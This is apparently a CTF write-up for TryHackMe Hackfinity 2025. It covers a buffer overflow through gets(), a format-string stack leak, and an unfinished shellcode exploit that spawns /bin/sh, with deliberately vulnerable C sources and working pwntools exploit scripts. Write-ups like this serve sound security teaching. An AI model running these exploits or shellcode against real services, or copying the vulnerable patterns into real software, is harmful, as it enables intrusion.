+++
title = "Ctf Thm Hackfinity 2025"
date = "2025-03-20T21:20:24+01:00"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["write-up", "HTM-hackfinity-2025", "re", "pwn", "pentest"]
keywords = ["", ""]
description = "Some write-ups for the THM Hackfinity 2025 CTF"
showFullContent = false
readingTime = false
hideComments = false
+++

{{< custom-toc >}}

## PWN - FlagVault

This challenge is about exploitation a flag vault manager app running on a remote host on port **1337** (this is hinited in challenge description).

We have access directly to the source code which will simplify the reverse engineering part (even though code is not obfuscated and pretty small, making reversing the binary equivalent)

### Enumeration

We connect to the service (if you see `localhost` its because im running it locally)

```shell
$ socat tcp:localhost:1337 -
  ______ _          __      __         _ _   
 |  ____| |         \ \    / /        | | |  
 | |__  | | __ _  __ \ \  / /_ _ _   _| | |_ 
 |  __| | |/ _` |/ _` \ \/ / _` | | | | | __|
 | |    | | (_| | (_| |\  / (_| | |_| | | |_ 
 |_|    |_|\__,_|\__, | \/ \__,_|\__,_|_|\__|
                  __/ |                      
                 |___/                       
                                             
Version 1.0 - Passwordless authentication evolved!
==================================================================

Username: toto
Wrong password! No flag for you.
```

We get kicked at as we enter a wrong username. Even though we see a `"Wrong password"` message, this is the default as we can test other usernames which all leads to the same error message.

### Analysis

#### Source code

```C
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 1.0 - Passwordless authentication evolved!\n"
		"==================================================================\n\n"
	     );
}

void print_flag(){
	FILE *f = fopen("flag.txt","r");
	char flag[200];

	fgets(flag, 199, f);
	printf("%s", flag);
}

void login(){
	char username[100] = "";
	char password[100] = "";

	printf("Username: ");
	gets(username);

	// If I disable the password, nobody will get in.
	//printf("Password: ");
	//gets(password);

	if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
		print_flag();
	}
	else{
		printf("Wrong password! No flag for you.");
	}
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

The `main` will disable buffering for standard IOs (this is classical in CTFs and should not be looked up too much). Then it calls a function that prints a banner (the one we saw in enum) and finally enter the `login` function.

In the later, we see that the programs allocates a `username` and `password` buffer of both **100** characters, then proceed to request the username from the user but deliberately supressed the password retrieving part so he think we could not enter a valid password. Then it compares inputs against hardcoded values.

But our dear programmer forgets about how `gets` works. That's pretty sad for him as a warning message is typically displayed when you try to compile code using this function:
```shell
gcc using-gets.c -o using-gets
using-gets.c: In function ‘login’:
using-gets.c:32:2: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   32 |  gets(username);
      |  ^~~~
      |  fgets
/usr/bin/ld: /tmp/ccX8oo5n.o: in function `login':
using-gets.c:(.text+0x1cd): warning: the `gets' function is dangerous and should not be used.
```

Looking at the documentation of `gets`, we clearly understand why it should not be used:

```shell
$ man gets
...
DESCRIPTION
       Never use this function.

       gets()  reads  a  line  from stdin into the buffer pointed to by s until either a terminating newline or EOF,
       which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).
...
BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how  many  characters
       gets()  will read, and because gets() will continue to store characters past the end of the buffer, it is ex‐
       tremely dangerous to use.  It has been used to break computer security.  Use fgets() instead.
```

This means that every buffer of a certain length which is passed to `gets` can be overflowed (meaning we write more bytes than the buffer can hold, and override the memory next to the buffer)

Going back to the source code we understand that even if we can't enter a password, the buffer overflow on the `username` variable allow us to override the `password` memory, and eventually supply the right password so that `print_flag` get called.

### Exploitation

First of all, we need to compile the binary to inspect how memory layout of the stack variables would typically look likes. This is needed because the compiler can decide to add space between our stack variables (padding), meaning the source offsets aren't valid when running the binary.

```shell
gcc source.c -o source
```

Then we open the binary in any disassembler (I use IDA). Then we look at the `login` function disassembly:

![Login function disassembly](/img/thm-hackfinity-2025/login-function.png)

The program is likely compiled for **x86_64** architecture (but this is fully a guess and there is no acual way to know that from the running service). Thus, we know it likely uses System-V ABI calling convention where arguments are first passed into registers (1st arg in `rdi`, 1nd in `rsi`, etc... look at [this ressource](https://wiki.osdev.org/System_V_ABI#x86-64)).

By analyzing the argument setup for the two `strcmp` calls, we notice the input argument address in the `rdi` registers (`[rbp+var_E0]` and `[rbp+var_70]`). These are stack variables and that's why they are indexed from `rbp`, so to know the actual offset from the start of our first input at `rbp-0xE0` (`-` because stack grows backward, from high to low addresses), to the password buffer at `rbp-0x70`, we just substract them (giving an offset of 112 bytes).

Now we know everything we need to exploit this binary, we will craft the exploit code that write the username in its right location (making sure to append an `\0` so `strcmp` doesn't read all our input), overflow username so we can put the password at the right location.

```python
from pwn import *
import argparse
import time

parser = argparse.ArgumentParser()

parser.add_argument('ip')

args = parser.parse_args()

p = remote(args.ip, 1337)

print(p.recv(timeout=1))

payload = flat(
    b"bytereaper\0",
    b"P"*(112-11),
    b"5up3rP4zz123Byte\0"
)

time.sleep(0.5)

p.sendline(payload)

print(p.recvall(timeout=1))
```

And running it gives us the flag:
```shell
$ python3 exploit.py 10.10.211.12
[+] Opening connection to 10.10.211.12 on port 1337: Done
b'  ______ _          __      __         _ _   \n |  ____| |         \\ \\    / /        | | |  \n | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n                  __/ |                      \n                 |___/                       \n                                             \nVersion 1.0 - Passwordless authentication evolved!\n==================================================================\n'
[+] Receiving all data: Done (34B)
[*] Closed connection to 10.10.211.12 port 1337
b'\nUsername: THM{XXX}\n'
```


## PWN - Flag Vault 2

We need to exploit this flag vault manager app again !

We have the same kind of information as earlier.

### Basic Enumeration

Upon connection, we are still prompted for username as earlier, but we notice a special message
in the banner hinting that the program should not print the flag anymore.

```shell
$ socat tcp:localhost:1337 - 
  ______ _          __      __         _ _   
 |  ____| |         \ \    / /        | | |  
 | |__  | | __ _  __ \ \  / /_ _ _   _| | |_ 
 |  __| | |/ _` |/ _` \ \/ / _` | | | | | __|
 | |    | | (_| | (_| |\  / (_| | |_| | | |_ 
 |_|    |_|\__,_|\__, | \/ \__,_|\__,_|_|\__|
                  __/ |                      
                 |___/                       
                                             
Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!
==================================================================

Username: 
```


### Analysis 

#### Source code

```C
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(char *username){
    FILE *f = fopen("flag.txt","r");
    char flag[200];

    fgets(flag, 199, f);
    //printf("%s", flag);
	
	//The user needs to be mocked for thinking they could retrieve the flag
	printf("Hello, ");
	printf(username);
	printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
	printf("Yours truly,\nByteReaper\n\n");
}

void login(){
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// The flag isn't printed anymore. No need for authentication
	print_flag(username);
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

In this new version, the program doesn't retrieve password anymore because the flag isn't printed, but we notice it is still stored in memory, in the stack frame of `print_flag`. In this function, we can see a bad usage of the `printf` function where a user supplied input is passed as the `fmt` argument for the function printf.

This allows an attacker to provide format strings that would be processed by printf. As many of these formats can be used to display printf arguments (and the actual hasn't any), we can try to leak the stack values in the function. 

Remember that in `x86-64` arguments are first passed into registers and then into the stack if there is more. This means that if we provide more than 6 `%p` in input, we should start leaking stack values.

Now its a matter of testing in order to find the correct printf argument offset to the flag, and then try to leak entirely. I usually use pwntools for such things, but in our case it was simple enough for trying manually. We supply enough `%p-` into the input, and look at printed values. If we see many printed pointers that holds only ASCII values, we can try to see if its the flag. It could also be determined theorically.

After trying a bit, I found correct offsets to flag and succeeded to dump it using the format string:
```python
from pwn import *
import argparse
import time

parser = argparse.ArgumentParser()
parser.add_argument("ip")
args = parser.parse_args()

p = remote(args.ip, 1337)

time.sleep(0.5)

p.sendline(f"%10$p-%11$p-%12$p".encode())

p.recvuntil(b'Hello, ')
flag_encoded = p.recvline().strip().decode().split('.')[0].split('-')

parts_decoded = [ p64(int(x, 16)) for x in flag_encoded ]
flag = b''.join(parts_decoded).replace(b'\x00', b'').replace(b'\n', b'').decode()

print(flag)
```

## PWN - VoidExec

**_Work In Progress_**

```python
from pwn import *
import argparse

context.arch = 'amd64'
context.os = 'linux'
context.bits = 64

blacklist = [b"\x0f", b"\xCD\x80"]

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    subparsers = parser.add_subparsers(dest='command')

    parser_local = subparsers.add_parser('local')
    parser_local.add_argument('binary')

    parser_remote = subparsers.add_parser('remote')
    parser_remote.add_argument('host')
    parser_remote.add_argument('port', type=int)

    #parser.add_argument('--libc', required=True)
    #parser.add_argument('--binary', required=True)

    args = parser.parse_args()

    if args.command == 'local':
        p = process(args.binary)
    elif args.command == 'remote':
        p = remote(args.host, args.port)
    else:
        parser.print_help()
        exit(1)
    
    #binary = ELF(args.binary)
    #libc = ELF(args.libc)
    
    #sc = b"\xF3\x0F\x1E\xFA"
    sc = bytes([
        0x48, 0x8b, 0x3c, 0x24, 0x48, 0x81, 0xc7, 0xee, 0x2b, 0x00, 0x00, 0x48,
        0x8b, 0x17, 0x48, 0x81, 0xea, 0xe0, 0x00, 0x03, 0x00, 0x31, 0xf6, 0x48,
        0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x56, 0x53, 0x48,
        0x89, 0xe7, 0x56, 0xff, 0xd2, 0xc3
   ])

    sc = encode(sc, avoid=blacklist)

    for i in range(len(sc)-1):
        if sc[i] == blacklist[0] or (sc[i] == blacklist[1][0] and sc[i+1] == blacklist[1][1]):
            raise Exception('blacklist char {} at {}'.format(sc[i], i))

    #gdb.attach(p)

    #input('enter to continue')

    p.sendline(sc)

    p.interactive()


```
